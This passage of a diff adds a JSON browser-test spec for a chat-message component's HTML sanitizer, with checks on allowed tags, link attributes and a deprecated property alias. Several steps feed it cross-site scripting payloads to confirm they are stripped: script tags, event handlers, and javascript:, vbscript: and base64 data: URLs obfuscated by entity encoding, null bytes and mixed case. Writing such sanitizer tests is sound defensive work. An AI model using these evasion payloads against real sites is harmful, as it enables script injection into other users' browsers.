scope=\\\"javascript:alert(1)\\\">x</td><div><span><script>alert(1)</script>текст</span></div><svg><foreignObject><p onclick=\\\"alert(1)\\\">x</p></foreignObject></svg><object><embed><iframe><p>x</p></iframe></embed></object><style><img src=x onerror=alert(1)></style><p>after</p><ul><li><a href=\\\"javascript:alert(1)\\\"><strong>x</strong></a></li></ul>\"}, true)",
+          "wait": 400,
+          "check": "(() => { const m = document.querySelector('#s .sf-chat-markup'); for (const el of m.querySelectorAll('*')) for (const type of ['click', 'mouseover', 'focus', 'toggle']) el.dispatchEvent(new Event(type, {bubbles: true})); const inner = [...m.querySelectorAll('*')].filter((el) => !el.closest('.sf-chat-markup__table') || el.closest('table')); const tags = new Set(inner.map((el) => el.localName)); const okTags = [...tags].every((tag) => ['p', 'a', 'table', 'tbody', 'tr', 'td', 'code', 'br', 'strong', 'ul', 'li'].includes(tag)); const attrs = inner.flatMap((el) => [...el.attributes].map((a) => el.localName + '[' + a.name + '=' + a.value + ']')); return window.__alerts.length === 0 && okTags && attrs.every((one) => /^(a\\[(href=(https?:\\/\\/|mailto:|\\/[^/\\\\])|rel=noopener noreferrer nofollow|target=_blank)|t[dh]\\[(colspan|rowspan)=\\d+\\]|t[dh]\\[scope=(row|col|rowgroup|colgroup)\\]|code\\[class=language-js\\])/.test(one)); })()"
+        },
+        {
+          "script": "(document.querySelector('#s').message = {\"id\":\"s2\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"html\":\"<a href=\\\"javascript:alert(1)\\\">x</a><a href=\\\" javascript:alert(1)\\\">x</a><a href=\\\"\\tjavascript:alert(1)\\n\\\">x</a><a href=\\\"javascript&#58;alert(1)\\\">x</a><a href=\\\"javascript&colon;alert(1)\\\">x</a><a href=\\\"java&#x09;script:alert(1)\\\">x</a><a href=\\\"java&#0000106script:alert(1)\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"jav\\u0000ascript:alert(1)\\\">x</a><a href=\\\"JaVaScRiPt:alert(1)\\\">x</a><a href=\\\" JaVaScRiPt:alert(1)\\\">x</a><a href=\\\"\\tJaVaScRiPt:alert(1)\\n\\\">x</a><a href=\\\"JaVaScRiPt&#58;alert(1)\\\">x</a><a href=\\\"JaVaScRiPt&colon;alert(1)\\\">x</a><a href=\\\"JaVa&#x09;ScRiPt:alert(1)\\\">x</a><a href=\\\"JaVa&#0000106ScRiPt:alert(1)\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"JaV\\u0000aScRiPt:alert(1)\\\">x</a><a href=\\\"vbscript:alert(1)\\\">x</a><a href=\\\" vbscript:alert(1)\\\">x</a><a href=\\\"\\tvbscript:alert(1)\\n\\\">x</a><a href=\\\"vbscript&#58;alert(1)\\\">x</a><a href=\\\"vbscript&colon;alert(1)\\\">x</a><a href=\\\"vbsc&#x09;ript:alert(1)\\\">x</a><a href=\\\"vbsc&#0000106ript:alert(1)\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"vbs\\u0000cript:alert(1)\\\">x</a><a href=\\\"VBScript:alert(1)\\\">x</a><a href=\\\" VBScript:alert(1)\\\">x</a><a href=\\\"\\tVBScript:alert(1)\\n\\\">x</a><a href=\\\"VBScript&#58;alert(1)\\\">x</a><a href=\\\"VBScript&colon;alert(1)\\\">x</a><a href=\\\"VBSc&#x09;ript:alert(1)\\\">x</a><a href=\\\"VBSc&#0000106ript:alert(1)\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"VBS\\u0000cript:alert(1)\\\">x</a><a href=\\\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\" data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"\\tdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\n\\\">x</a><a href=\\\"data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"data&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"data&#x09;:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"data&#0000106:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"dat\\u0000a:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"DaTa:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\" DaTa:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"\\tDaTa:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\n\\\">x</a><a href=\\\"DaTa&#58;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"DaTa&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"DaTa&#x09;:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"DaTa&#0000106:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"DaT\\u0000a:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a>\"}, true)",
+          "wait": 300,
+          "check": "(() => { const m = document.querySelector('#s .sf-chat-markup'); return m.querySelectorAll('a').length === 0 && m.textContent === \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"; })()"
+        },
+        {
+          "script": "(document.querySelector('#s').message = {\"id\":\"s3\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"html\":\"<h2>A</h2><h3>B</h3><h4>C</h4><p><del>old</del> new</p><h1>D</h1><s>E</s>\"}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#s .sf-chat-markup').innerHTML === '<h2>A</h2><h3>B</h3><h4>C</h4><p><del>old</del> new</p>DE'"
+        },
+        {
+          "script": "(document.querySelector('#s').message = {\"id\":\"s4\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"html\":\"<h3>Итог</h3><p><strong>28</strong> дней, <em>см.</em> <a href=\\\"https://example.gov.ru/tk/125\\\">ТК</a> и <a href=\\\"/app/help\\\">справку</a></p><pre><code class=\\\"language-js\\\">a &lt; b</code></pre><blockquote>цитата</blockquote><ul><li>раз</li></ul><table><thead><tr><th colspan=\\\"2\\\" scope=\\\"col\\\">A</th></tr></thead></table>\"}, true)",
+          "wait": 300,
+          "check": "(() => { const m = document.querySelector('#s .sf-chat-markup'); const html = m.innerHTML; const code = m.querySelector('code.language-js'); return html.startsWith('<h3>Итог</h3><p><strong>28</strong> дней, <em>см.</em> <a href=\"https://example.gov.ru/tk/125\" rel=\"noopener noreferrer nofollow\" target=\"_blank\">ТК</a> и <a href=\"/app/help\" rel=\"noopener noreferrer nofollow\" target=\"_blank\">справку</a></p>') && html.includes('<blockquote>цитата</blockquote><ul><li>раз</li></ul>') && code && code.textContent === 'a < b' && m.querySelector('th[colspan=\"2\"][scope=col]').textContent === 'A'; })()"
+        }
+      ]
+    },
+    {
+      "id": "p10-view-alias",
+      "title": "the 0.3 property view writes display, noted once with its dates; English words follow [lang]",
+      "covers": "aliases view, lang/en.json",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#e').message = {id: 'e1', role: 'assistant', status: 'running', stage: 'searching'}, document.querySelector('#e').view = {wait: 'delayed'}, true)",
+          "wait": 300,
+          "expect": {
+            "journal": [
+              {
+                "from": "view",
+                "since": "2026-10-28",
+                "remove_after": "2026-12-01"
+              }
+            ]
+          },
+          "check": "document.querySelector('#e').display.wait === 'delayed' && document.querySelector('#e .sf-chat-notice__text').textContent === 'The answer is taking longer than usual' && document.querySelector('#e .sf-chat-notice__action').textContent === 'Refresh'"
+        }
+      ]
+    }
+  ]
+}
